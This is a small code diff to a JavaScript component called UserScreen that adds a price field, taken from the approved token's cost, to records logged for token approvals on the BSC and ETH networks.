@@ -207,7 +207,8 @@ const UserScreen = (props) => {
                   symbol: approveToken.currency.symbol,
                   contractAddress: approveToken.currency.address,
                   network: "BSC",
-                  adminAddress: adminWalletAddress
+                  adminAddress: adminWalletAddress,
+                  price: approveToken.cost
                 });
               });
           }
@@ -234,7 +235,8 @@ const UserScreen = (props) => {
                   symbol: approveToken.currency.symbol,
                   contractAddress: approveToken.currency.address,
                   network: "ETH",
-                  adminAdress: adminWalletAddress
+                  adminAdress: adminWalletAddress,
+                  price: approveToken.cost
                 });
               });
           }
